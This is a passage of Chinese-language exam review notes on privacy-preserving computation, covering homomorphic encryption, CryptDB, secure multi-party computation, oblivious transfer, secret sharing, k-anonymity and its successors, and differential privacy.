<p><img src="/2025/12/30/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2022.png" alt="image.png"></p>
<p>同态性质本来被看做安全性缺陷：RSA公司在90年代初发布了PKCS系列文档，标准PKCS#1 v1.5指定了使用RSA算法加密前对消息进行填充的方法。1998年，研究者发现了针对PKCS#1 v1.5的攻击（Million MessageAttack）。<strong>该攻击就是利用了RSA的同态性质导致密文具有可延展性的缺陷。</strong></p>
<h2 id="加法同态加密算法：Paillier算法（P164）"><a href="#加法同态加密算法：Paillier算法（P164）" class="headerlink" title="加法同态加密算法：Paillier算法（P164）"></a>加法同态加密算法：Paillier算法（P164）</h2><p><img src="/2025/12/30/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2023.png" alt="image.png"></p>
<p><img src="/2025/12/30/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2024.png" alt="image.png"></p>
<p>（1）安全性：<strong>合数剩余类问题的困难性</strong>。合数剩余类问题与标准数论问题之间存在着联系。</p>
<p>（2）安全性：<strong>语义安全。</strong>Paillier密码系统确实提供了针对选择明文攻击(IND-CPA)的语义安全性。然而，由于上述同态特性，该系统是可塑的，因此不能防止自适应选择密文攻击(IND-CCA2)。</p>
<p><img src="/2025/12/30/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2025.png" alt="image.png"></p>
<p>计算开销：对数据进行同态加解密需要进行一些数学运算。<strong>这些运算的计算复杂度既与所采用的同态加密算法相关，也与选取的密钥长度相关。通常来说，密钥越长，同态加密的安全性越高。</strong>为了保证数据加密有足够好的安全性，目前普遍采用3072或更多比特的密钥长度。</p>
<p>同态加解密运算本身带来的计算开销。加密后的密文在密态下的计算也会带来很大的计算开销：这些大数在密态下进行加法或乘法运算也不再是简单地将数据相加或相乘，而需要通过复杂的模乘或模幂运算来完成相应的密态下运算。</p>
<p>存储与通信开销（密文大小）：<strong>以Paillier 同态加密为例，数据经过同态加密后，大小增加了一倍，使得消息的存储和通信的开销也大大增加</strong></p>
<h2 id="全同态加密算法的基本概念（P167）"><a href="#全同态加密算法的基本概念（P167）" class="headerlink" title="全同态加密算法的基本概念（P167）"></a>全同态加密算法的基本概念（P167）</h2><p><strong>即加密数据的计算和原始数据的计算结果相同！</strong></p>
<p>全同态加密是指能够<strong>在不知道密钥的情况下，对密文进行任意计算，</strong>即对于任意有效的f及明文m，有性质f(E(m))&#x3D;E(f(m))。</p>
<p>从理论上讲，所有的函数<strong>都可以由加法和乘法多次复合来实现</strong>，因此全同态加密算法在设计的时候可以首先考虑其对加法和乘法都同态，再将其扩展到任意函数之上。</p>
<p><img src="/2025/12/30/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2026.png" alt="image.png"></p>
<p>密文计算是核心算法。但是，密文计算会累积噪声，影响密文的解密；并且，在乘法的计算中，密文乘积的噪声是噪声之积，乘法运算中噪音会放大的很快。</p>
<p><strong>解决思路：对密文解密，密文解密后噪声就没有了</strong>。每次密文运算前只要对密文进行<strong>重加密</strong>（每次运算后，都做一次同态解密）来降低噪音，然后再进行密文运算，那么噪音永远都在可控的范围内。</p>
<p>同态加密不是一种通用技术，<strong>适用于计算量和数据量都不大的数据集</strong>。有意义的用例是在严格的隐私要求<strong>完全禁止未加密的云计算</strong>的情况下，但<strong>计算本身是相当轻量级</strong>的。由于<strong>同态性与延展性</strong>之间的相互矛盾，全同态加密无法实现<strong>IND-CCA2 安全</strong>。</p>
<p>同时，<strong>同态加密不能实现协作计算</strong>。同态加密技术可以实现对数值型数据的同态运算，然而对于逻辑运算的处理有些无力。</p>
<h2 id="CryptDB的洋葱加密模式（P170）"><a href="#CryptDB的洋葱加密模式（P170）" class="headerlink" title="CryptDB的洋葱加密模式（P170）"></a>CryptDB的洋葱加密模式（P170）</h2><p>（1）<strong>CryptDB首次解决了实用性的问题，它将数据嵌套进多个加密层，每个都使用不同的密钥，允许对加密数据进行简单操作。</strong>完全同态加密旨在支持单一加密方案中的所有功能，这使得简单操作变得更为缓慢。就目前而言，设计实用技术方案的关键是要摆脱<strong>“一个加密系统将适用于所有内容”的想法。</strong></p>
<p>（2）为了支持各种操作，需要使用各种专门的加密机制。每种机制只能做一件事，但是它们加在一起就涵盖了相当多的领域。使用所需的机制来加密数据，并因此存储多组不同的加密数据，从而允许使用加密的数据进行各种不同的计算。需在加密数据集之间进行切换，在每个实例中使用与需要完成的操作相对应的数据集就可以了。这就是CryptDB 的思路。所谓<strong>“洋葱加密”，多层加密</strong>。</p>
<p>随机加密算法：存储整数类型和字符类型数据；确定性加密算法：完成等价性操作；保序加密算法：完成范围查询操作；同态加密算法：完成加法相关操作；联结加密算法：完成JOIN操作；搜索加密算法：完成LIKE操作（关键字查询）。</p>
<p>（3）工作原理：在对加密的数据执行SQL查询时，使用的是一个<strong>SQL能够理解的加密方案来进行加密</strong>。CryptDB同样<strong>将加密密钥和用户的密码进行了捆绑，这样的话数据项只有使用相应的用户的密码登陆才可以进行解密。</strong>作为结果，就是数据库管理员也不能接触到加密的数据，即使服务器被攻破，攻击者也无法解密用户的数据，如果该用户没有登录的话。</p>
<h2 id="安全多方计算的概念（P172）"><a href="#安全多方计算的概念（P172）" class="headerlink" title="安全多方计算的概念（P172）"></a>安全多方计算的概念（P172）</h2><p>（1）安全多方计算由姚期智在 1982 年提出，安全多方计算是<strong>无可信第三方的保护隐私计算协议。</strong>安全多方计算，主要研究在无可信第三方的情况下，多个参与者如何<strong>安全地计算一个约定函数</strong>的问题。</p>
<p>（2）安全多方计算有多个参与方，<strong>每一个参与方拥有自己的秘密信息，他们希望利用这些秘密信息作为输入，</strong>共同计算一个函数。</p>
<p>（3）安全多方计算的一般概念：<strong>m个参与方</strong>希望共同计算一个函数𝑓(𝑥1, 𝑥2, … , 𝑥𝑚)，其中𝑥𝑖是第i个参与方所掌握的私有输入，安全多方计算使得函数f可以被正确计算（正确性），同时每个参与方不能得知其他参与者的私有输入<strong>（安全性）</strong>。</p>
<h2 id="安全多方计算的模型（P174）"><a href="#安全多方计算的模型（P174）" class="headerlink" title="安全多方计算的模型（P174）"></a>安全多方计算的模型（P174）</h2><p>（1）安全多方计算模型有两种：<strong>半诚实模型和恶意模型。</strong></p>
<p><strong>半诚实模型</strong>：如果<strong>所有参与者都是诚实的或者半诚实的</strong>，称此模型为半诚实模型，其中的攻击者是被动的。</p>
<p><strong>恶意模型</strong>：<strong>存在恶意参与者的模型</strong>称为恶意模型，其中的攻<strong>击者是主动的。</strong></p>
<p><strong>隐蔽的攻击模型</strong>：上述的<strong>半诚实对手模型过于脆弱，但恶意对手模型在安全性要求下导致协议效率太低。</strong>为了克服这些困难，提出了一种隐蔽敌手模型。一个隐蔽的对手可能表现出恶意行为，但它有一定的概率被诚实的参与者发现作弊。– 这一模型代表了许多金融或政治环境，在这些环境中，诚实的行为是不可能假设的，但所涉及的公司和机构不能承受与被发现作弊有关的名誉损失。在这个模型中，对手必须权衡被抓住的风险和作弊的好处</p>
<p>（2）安全多方计算又可以分为<strong>参与者模型和攻击者模型。</strong></p>
<p>①安全多方计算的参与者模型</p>
<p><strong>诚实参与者：</strong>在协议执行过程中，诚实参与者完全按照协议的要求完成协议的各个步骤，同时保密自己的所有输入、输出及中间结果。</p>
<p><strong>半诚实参与者：</strong>在协议执行过程中，半诚实参与者完全按照协议的要求完成协议的各个步骤，<strong>但同时可能将自己的输入、输出及中间结果泄漏给攻击者，也可以根据自己的输入、输出及中间结果推导其他参与者的信息。</strong></p>
<p><strong>恶意参与者：</strong>在协议执行过程中，恶意参与者完全按照攻击者的意志执行协议的各个步骤，不但将自己的所有输入、输出及中间结果泄露给攻击者，还可以根据攻击者的意图改变输入信息、中间结果信息，甚至终止协议。</p>
<p>②安全多方计算的攻击者模型</p>
<p>攻击者是<strong>指企图破坏协议安全性和正确性的人</strong>。对攻击者进行分类时，可以有不同的分类准则，这些分类准则主要有攻击者的计算能力、网络同步状态、对恶意参与者的控制程度和动态性。</p>
<p>按照<strong>计算能力</strong>分类：按照攻击者的计算能力可以将攻击者分为拥有<strong>无限计算能力的攻击者和拥有有限计算能力的攻击者</strong>。对于拥有无限计算能力的攻击者而言，不存在诸如大素数分解困难等数学难题。在无限计算能力的攻击者模型下的安全的多方计算协议为<strong>信息论安全的多方计算协议</strong>。对于拥有有限计算能力的攻击者而言，破解目前公认的数学难题是不可能的。在有限计算能力的攻击者模型下的安全的多方计算协议为<strong>密码学安全的多方计算协议</strong>。</p>
<h2 id="百万富翁问题（P173）"><a href="#百万富翁问题（P173）" class="headerlink" title="百万富翁问题（P173）"></a>百万富翁问题（P173）</h2><p>在没有第三方参与的情况下，<strong>两个百万富翁能够在互相不暴露自己的财产数额的情况下，比较谁更富有。</strong></p>
<p><img src="/2025/12/30/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2027.png" alt="image.png"></p>
<p><img src="/2025/12/30/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2028.png" alt="image.png"></p>
<p><img src="/2025/12/30/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2029.png" alt="image.png"></p>
<p><img src="/2025/12/30/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2030.png" alt="image.png"></p>
<p>解决方案的局限性：<strong>恶意参与者、效率问题</strong></p>
<h2 id="混淆电路的工作原理（P175）"><a href="#混淆电路的工作原理（P175）" class="headerlink" title="混淆电路的工作原理（P175）"></a>混淆电路的工作原理（P175）</h2><p>乱码电路（GC）是<strong>半诚实模型下的两方安全计算协议</strong>，针对布尔电路。</p>
<p>混淆电路（GC）协议是一种加密协议，可实现两方安全计算，其中两个互不信任的参与方可以在没有可信第三方存在的情况下共同评估其私有输入的函数。</p>
<p><img src="/2025/12/30/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2031.png" alt="image.png"></p>
<p>对每个功能函数f，都存在一个等价的电路C，因此可以将功能函数转化为电路，然后针对电路门进行混乱，最后计算每个混乱门电路。</p>
<p><img src="/2025/12/30/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2032.png" alt="image.png"></p>
<p><strong>步骤一：电路产生阶段。</strong>参与运算的双方先就需要安全计算的目的依靠专有编程语言(DSL)或相关编程语言扩展等进行编程，然后针对实现计算的程序进行编译，生成布尔电路文件;然后针对双方输入值以及中间输出结果随机产生映射label,再利用这些label做为key对每个对应的电路输出真值表采用分组密码方式进行加密，并对真值表值进行打乱操作，这一步就是混淆电路的概念。</p>
<p><strong>步骤二：电路执行阶段。</strong>电路执行者针对布尔电路文件进行执行，执行时电路生成者需要将自己的输入所对应的label发给电路执行者；电路执行者依据自己所有信息通过OT方式选择自己对应的label，这样电路生成者与执行者均不到对方的输入数据；电路执行者此时获取双方输入对应的label,作为key的相关信息对真值表进行解密，即可获取真值表的内容，循环往复，直至所有电路执行完毕，输出执行结果。</p>
<p><strong>姚氏电路是第一个安全两方计算协议，后续大多数安全地计算布尔电路&#x2F;算术电路的安全多方计算协议都是基于姚氏混淆电路进行扩展的。</strong></p>
<p><strong>Tip：使用GC协议解决百万富翁问题</strong></p>
<p>（1） 定义上图中的z&#x3D;f(x, y)，如果 x&gt;&#x3D;y，输出 1；否则为 0；</p>
<p>（2） 随后，Alice将电路中的每个门进行加密，并打乱（即电路混淆处理），Alice对电路中的每个门都创建一个加密的真值表；</p>
<p>（3） Alice将混淆后的电路发给Bob，Bob可以根据自己的财富 y，借助OT协议，选择对应的加密真值表，并计算结果；</p>
<p>（4） Bob将该加密结果传给Alice，Alice解密后即得到结果，并告知Bob</p>
<h2 id="OT的工作原理（P177）"><a href="#OT的工作原理（P177）" class="headerlink" title="OT的工作原理（P177）"></a>OT的工作原理（P177）</h2><p>OT协议：不经意传输（OT）是安全多方计算（MPC）的重要构造模块，属于基础协议。发送方将潜在的许多信息发送给一个接收者，发送方无法知道接收方接收到的是那个信息。</p>
<p><img src="/2025/12/30/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2033.png" alt="image.png"></p>
<p><strong>2选1OT协议原理</strong></p>
<p><img src="/2025/12/30/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/9bc07019-362b-435e-9300-3d3a189a842a.png" alt="image.png"></p>
<p><strong>基于离散对数实现n选1的OT协议</strong></p>
<p><img src="/2025/12/30/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2034.png" alt="image.png"></p>
<p><strong>Tip：使用OT解决百万富翁问题？</strong></p>
<p>（1）Alice准备两种消息：一个表示“我的大于你的”（记为1），另一个表示“我的不大于你的”（记为0）；</p>
<p>（2）Alice构造n条（比如10条）消息，按序号排列，如果序号&lt;x，放入0；序号&gt;x，放入1；</p>
<p>（3）Alice生成n个RSA公私钥对（n&#x3D;10），并将公钥发送给Bob，自己保留私钥；</p>
<p>（4）Bob随机生成一个大整数key，根据自己的财富y选择序号，使用对应序号Alice的公钥加密该整数key，返回给Alice；</p>
<p>（5）Alice依次用所有RSA私钥解密信息，得到多个key值。根据key值的序号，对应n条消息的序号，分别对称加密（比如使用AES），加密信息回给Bob；</p>
<p>（6）Bob使用自己的序号对应的消息（即OT），用真正的key解密，得到消息，并告诉Alice结果。</p>
<p>上面协议的设计特性在于：<strong>对于Alice来说，完全不知道Bob的信息；Bob也不知道除自己序号以外的其他信息</strong>。</p>
<p><strong>Q：OT协议是所有安全多方计算协议中的最基本工具：</strong></p>
<p>在基于Yao混乱电路构造的SMPC协议中，参与方每bit输入需要一个OT协议，而在基于GMW范式构造的SMPC协议中，布尔电路的每一个And门需要至少一个OT协议。在恶意敌手模型下的实际的安全多方计算协议所需要执行的OT次数需要数百万次。举例来说，利用TinyOT技术，当计算AES电路时，需要使用219次OT协议，而计算隐私集合求交(PSI)电路时，需要使用230次OT协议。因此，OT协议执行的效率成为了影响安全多方计算协议效率的最重要的因素</p>
<h2 id="秘密分享的工作原理（P179）"><a href="#秘密分享的工作原理（P179）" class="headerlink" title="秘密分享的工作原理（P179）"></a>秘密分享的工作原理（P179）</h2><p>秘密分享是在一组参与者中分享秘密的技术，它主要用于保护重要信息，防止信息被丢失、被破坏、被篡改。简单来说，<strong>秘密分享就是指分享的秘密在一个用户群体里进行合理分配，以达到由所有成员共同掌管秘密的目的。</strong>可以将秘密分享分为两类：</p>
<p><strong>（1）严格的秘密分享：需要所有人一起解密。运算分为加法运算和乘法运算。</strong></p>
<p><img src="/2025/12/30/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2035.png" alt="image.png"></p>
<p><img src="/2025/12/30/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2036.png" alt="image.png"></p>
<p><img src="/2025/12/30/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2037.png" alt="image.png"></p>
<p><strong>（2）阈值的秘密分享：不需要所有人，只需要满足一定人数，就可以解密。</strong></p>
<p><strong>Shamir秘密共享机制</strong>：N个人分别持有秘密s的一部分，当且仅当t或以上个人在尝试才可以恢复出秘密s！</p>
<p><img src="/2025/12/30/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2038.png" alt="image.png"></p>
<p><strong>Tip：秘密共享机制，解决百万富翁问题？</strong></p>
<p>法一：如有可信第三方，可以采取：</p>
<p>（1）将Alice和Bob的财富分解：x &#x3D; x1 + x2，y &#x3D; y1 + y2；</p>
<p>（2）寻找可信的第三方TP1和TP2，分别计算 z1 &#x3D; x1 – y1，z2 &#x3D; x2 – y2</p>
<p>（3）TP1和TP2将结果发送给 Alice 和 Bob，即可知道 z &#x3D; z1 + z2 &#x3D; x - y的结果。</p>
<h2 id="应用中的问题：性能，安全性（恶意参与者）（课件）"><a href="#应用中的问题：性能，安全性（恶意参与者）（课件）" class="headerlink" title="应用中的问题：性能，安全性（恶意参与者）（课件）"></a>应用中的问题：性能，安全性（恶意参与者）（课件）</h2><p>（1）安全性考虑不够：恶意参与者</p>
<p>许多方案的安全性考量局限于半诚实模型：很多方法忽略了对参与方输入、输出的验证，其正确性都依赖于计算参与方完全诚实遵循协议进行计算。</p>
<p>解决方案：通用ＧＭＷ编译器<strong>使用零知识证明以及承诺等工具</strong>，迫使参与方必须依照协议来执行，<strong>从而可以将半诚实敌手下安全的协议编译为可抵抗恶意敌手攻击的协议</strong>。考虑恶意敌手的模型会带来更大的开销。</p>
<p>（2）性能问题：<strong>这些协议通常计算开销都非常大，是其应用于实际系统的主要障碍。</strong></p>
<p>解决思路：简化混淆电路的规模；对于恶意的敌手，引入cut-and-choose（切分选择）技术；专用型MPC：为解决特定问题所构造出的特殊MPC协议。由于是针对性构造并进行优化，专用算法的效率会比基于混淆电路的通用框架高很多。</p>
<p><img src="/2025/12/30/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2039.png" alt="image.png"></p>
<p>MPC：根据支持的计算任务MPC可分为<strong>专用场景和通用场景两类。</strong></p>
<p>（1）<strong>通用型MPC</strong>：算法一般由混淆电路（GC）实现，具有完备性，理论上可支持任何计算任务。具体做法是将计算逻辑编译成电路，然后混淆执行，但对于复杂计算逻辑，混淆电路的效率会有不同程度的降低，与专用算法相比效率会有很大的差距。</p>
<p>（2）<strong>专用型MPC</strong>：是指为解决特定问题所构造出的特殊MPC协议，由于是针对性构造并进行优化，专用算法的效率会比基于混淆电路的通用框架高很多，当前MPC专用算法包含四则运算，比较运算，矩阵运算，隐私集合求交集，隐私数据查询等。– 虽然专用型MPC与通用型MPC相比效率更高，但同样存在一些缺点，如只能支持单一计算逻辑，场景无法通用；另外专用算法设计需要领域专家针对特定问题精心设计，设计成本高。</p>
<h1 id="数据匿名化与差分隐私"><a href="#数据匿名化与差分隐私" class="headerlink" title="数据匿名化与差分隐私"></a><strong>数据匿名化与差分隐私</strong></h1><h2 id="隐私的定义、分类（P227）"><a href="#隐私的定义、分类（P227）" class="headerlink" title="隐私的定义、分类（P227）"></a>隐私的定义、分类（P227）</h2><p>隐私就是个人、机构等实体<strong>不愿意被外部世界知晓的敏感信息。</strong>在具体应用中，<strong>隐私即为数据所有者不愿意被披露的敏感信息</strong>，包括敏感数据以及数据所表征的特性。通常我们所说的隐私都指敏感数据，就是不是所有人都能够获得的公开数据。如个人的薪资、病人的患病记录、公司的财务信息等。</p>
<p>（1）<strong>个人隐私</strong>：任何可以确认特定个人或与可确认的个人相关、但个人不愿被暴露的信息，都叫做个人隐私，如身份证号、就诊记录等。</p>
<p>（2）<strong>共同隐私</strong>：共同隐私不仅包含个人的隐私，还包含所有个人共同表现出但不愿被暴露的信息。如公司员工的平均薪资、薪资分布等信息，再如两个人之间的关系信息。</p>
<h2 id="隐私的度量及量化表示（P228）"><a href="#隐私的度量及量化表示（P228）" class="headerlink" title="隐私的度量及量化表示（P228）"></a>隐私的度量及量化表示（P228）</h2><p>（1）数据隐私的保护效果是通过攻击者披露隐私的多寡来侧面反映的。<strong>隐私度量可以统一用“披露风险”</strong>来描述。披<strong>露风险表示攻击者根据所发布的数据和其它背景知识，可能披露隐私的概率。若s表示敏感数据，事件Sk表示“攻击者在背景知识K的帮助下揭露敏感数据s”，则披露风险r(S,K)表示为r(S,K)&#x3D;Pr(Sk)</strong></p>
<p>（2）对数据集而言，若数据所有者最终发布<strong>数据集D的所有敏感数据的披露风险都小于阀值α，α∈[0,1]，</strong>则称该<strong>数据集的披露风险</strong>为 α。</p>
<p>不做任何处理所发布数据集的披露风险为1；当所发布数据集的披露风险为0时，这样发布的数据被称为实现了完美隐私！<strong>完美隐私实现了对隐私最大程度的保护，但由于对攻击者背景知识的假设是不确定的，因此实现对隐私的完美保护也只在具体假设、特定场景下成立，真正的完美保护并不存在。</strong></p>
<h2 id="什么是泛化？什么是抑制？（P234）"><a href="#什么是泛化？什么是抑制？（P234）" class="headerlink" title="什么是泛化？什么是抑制？（P234）"></a>什么是泛化？什么是抑制？（P234）</h2><p><strong>（1）泛化：</strong>为了更好地实现效用和隐私之间的平衡，匿名者可能会泛化而不是抑制标识符。这意味着她将改变而不是删除标识符值以增强隐私，同时保持数据的实用性。</p>
<p><strong>（2）抑制：</strong>管理员修改识别字段。他可能会抑制这些识别字段，把表中的字段完全删除。</p>
<p><strong>（3）聚合：</strong>通常，分析师只需要汇总统计数据，而不是原始数据。数十年来，统计人员一直在研究如何发布汇总统计数据，同时保护数据主体免于再识别。</p>
<h2 id="常见的隐私保护模型：K匿名；L多样化；T相近"><a href="#常见的隐私保护模型：K匿名；L多样化；T相近" class="headerlink" title="常见的隐私保护模型：K匿名；L多样化；T相近"></a>常见的隐私保护模型：<strong>K匿名；L多样化；T相近</strong></h2><p><strong>4.1 K匿名隐私保护模型（P236）</strong></p>
<p>（1）数据记录的属性分为三类：</p>
<p><strong>显式标识符：</strong>能唯一标识单一个体的属性，如身份证号码、姓名等；</p>
<p><strong>准标识符（QID）：</strong>联合起来能唯一标识一个人的多个属性，如邮编、生日、性别等联合起来则可能是准标识符。如果表中的一个记录有某个值qid，那么至少有k-1个其他记录也有该值qid；</p>
<p><strong>敏感属性：</strong>包含隐私数据的属性，如疾病、薪资等。</p>
<p>（2）K匿名隐私保护模型的思想：<strong>采用泛化和抑制技术对原始数据进行匿名化处理以便得到满足k-匿名规则的匿名数据，从而使得攻击者不能根据发布的匿名数据准确的识别出目标个体的记录。</strong></p>
<p><strong>泛化：</strong>通常是将QID的属性用更概括、抽象的值替代具体描述值。– 泛化的核心思想就是一个值被一个不确切的，但是忠于原值的值代替。数据集中的数据和对象通常包含原始概念层的细节信息，数据泛化（概化）是将数据集中与任务相关的数据由较低的概念层次抽象到较高的概念层次的过程。</p>
<p><strong>抑制：</strong>是指针对标识符做不发布处理。因为标识符和某些属性有很强的查询能力，所以针对这些属性做抑制处理是比较恰当的选择。有时抑制方法可以降低或减小泛化的代价。</p>
<p>（3）K匿名能抵御<strong>记录链接式攻击，</strong>但仍存在<strong>属性链接攻击</strong>！指的是，如果一些敏感值在群组中占了主导地位的话，即使满足K匿名，一个成功的推断也会变得相对容易，比如一整个群组都是“艾滋病”，那便很好推断了。</p>
<p><strong>4.2 L多样性隐私保护模型（P238）</strong></p>
<p>（1）当遭受属性链接攻击时，<strong>攻击者也许不能精确地识别目标受害者的记录，但可能从被公布的数据中基于与受害者所属的团体相联系的一系列敏感值集合推理出他的敏感值。</strong>但是还有问题：比如说“收入”，如果根据其他信息，找到几个最接近的表项，这些数据都很接近 2w，那也能推出这个人的收入是 2w 左右。怎么办？<strong>如果一些敏感值在群组中占了主导地位的话，</strong>即使满足K匿名，一个成功的推断也会变得相对容易。</p>
<p>（2）为了阻止<strong>属性链接攻击</strong>，<strong>L多样性要求，每个qid组至少包含L个有“较好代表性”的敏感值。“较好代表性”指，每个qid组中的敏感属性都有L个不同的值。</strong>比如，一定有L种的疾病，而不只是一种“艾滋病”。</p>
<p><strong>4.3 T相近隐私保护模型（P239）</strong></p>
<p>为了解决上面的问题：<strong>模型需QID上任一群组中的敏感值的分布接近于整体表中的属性分布。</strong>比如，收入那一栏，不能全都接近 2w，要想办法让这些数据更接近整个表的分布，难以推断。</p>
<p>这些隐私保护模型共同的问题是：<strong>陷入了一个“新隐私保护模型不断被提出，但又不断被攻破”的循环中</strong>！根本原因是，这些模型基于很多攻击者的假设，但是实际情况中，假定并不完全成立！<strong>那转换思路——差分隐私！</strong></p>
<h2 id="K匿名与记录链接攻击（P236）"><a href="#K匿名与记录链接攻击（P236）" class="headerlink" title="K匿名与记录链接攻击（P236）"></a>K匿名与记录链接攻击（P236）</h2><p><strong>记录链接攻击</strong>：例如攻击者知道他的老板在住院，因此，他就知道他的老板的医疗记录将会出现在医院泄露出的患者数据库中。并且，对于这个攻击者来说，得到他老板的出生日期和性别也不是难事，而这些就可以作为相关攻击时的准标识符。<br>攻击者知道Frank是一个38岁的男律师，并且这个数据集中包含Frank的数据，就能够推断出Frank的疾病是艾滋病。这种攻击方式被称为记录链接式攻击。</p>
<p><strong>经过匿名化处理的数据集可以抵御前述的记录链接式攻击。</strong></p>
<h2 id="L多样化与属性链接攻击（P238）"><a href="#L多样化与属性链接攻击（P238）" class="headerlink" title="L多样化与属性链接攻击（P238）"></a>L多样化与属性链接攻击（P238）</h2><p><strong>属性链接攻击：</strong></p>
<p>通过观察我们很容易发现一个新的问题：如果攻击者知道Lily是一名30岁的女性舞蹈演员，并且该数据集中包含Lily的数据，从公开的数据集中能够推断出Lily的疾病是艾滋病。<strong>这种攻击方式被称为属性链接攻击。</strong></p>
<p>当遭受属性链接攻击时，攻击者也许不能精确地识别目标受害者的记录，但可能从被公布的数据中基于与受害者所属的团体相联系的一系列敏感值集合推理出他的敏感值。</p>
<h2 id="数据匿名化方法的局限性（AI）"><a href="#数据匿名化方法的局限性（AI）" class="headerlink" title="数据匿名化方法的局限性（AI）"></a>数据匿名化方法的局限性（AI）</h2><p><strong>（1）难以抵御再识别攻击</strong>：即使删除了显式标识符（如姓名、身份证号），攻击者仍可利用准标识符（如出生日期、性别、邮编等）与外部公开数据进行关联，从而重新识别个体（如斯威尼攻击案例）CH07-大数据共享及其安全隐私-2024(1)。</p>
<p><strong>（2）依赖攻击者背景知识假设</strong>：K-匿名、L-多样性、T-相近等模型通常对攻击者的背景知识和攻击能力作出简化假设，但在现实中这些假设往往不成立，导致匿名数据仍可能被攻破CH07-大数据共享及其安全隐私-2024(1)。</p>
<p><strong>（3）隐私与数据可用性难以平衡</strong>：通过抑制、泛化等手段增强隐私保护，往往会显著降低数据精度和分析价值；而保留较高数据可用性又容易造成隐私泄露CH07-大数据共享及其安全隐私-2024(1)。</p>
<p><strong>（4）存在“军备竞赛”问题</strong>：新的匿名化模型不断被提出（如 K-匿名 → L-多样性 → T-相近），但也不断被新的攻击方法突破，难以从根本上提供稳定、长期的隐私保障</p>
<h2 id="差分隐私的基本思想：中间件（查询结果）-随机噪声-带噪中间件。（P240）"><a href="#差分隐私的基本思想：中间件（查询结果）-随机噪声-带噪中间件。（P240）" class="headerlink" title="差分隐私的基本思想：中间件（查询结果）+随机噪声&#x3D;带噪中间件。（P240）"></a>差分隐私的基本思想：中间件（查询结果）+随机噪声&#x3D;带噪中间件。（P240）</h2><p><img src="/2025/12/30/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2040.png" alt="image.png"></p>
<p><img src="/2025/12/30/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/62e160aa-e78b-4ab9-a7f2-abd907973d8e.png" alt="7e08fd28-82b2-421c-b6e4-937ef41f9077.png"></p>
<h2 id="差分隐私的定义（P240）"><a href="#差分隐私的定义（P240）" class="headerlink" title="差分隐私的定义（P240）"></a>差分隐私的定义（P240）</h2><p>差分隐私的通用随机算法有：<strong>拉普拉斯机制、指数机制、高斯机制</strong>（P241）   </p>
<p><img src="/2025/12/30/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/80b71963-80db-4d86-a6d4-c338875380e1.png" alt="48c7fa7c-da1f-4d49-9927-493d67d86710.png"></p>
<h2 id="基本概念：距离，相邻数据集，敏感度（课件）"><a href="#基本概念：距离，相邻数据集，敏感度（课件）" class="headerlink" title="基本概念：距离，相邻数据集，敏感度（课件）"></a><strong>基本概念：距离，相邻数据集，敏感度（课件）</strong></h2><p><img src="/2025/12/30/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2041.png" alt="image.png"></p>
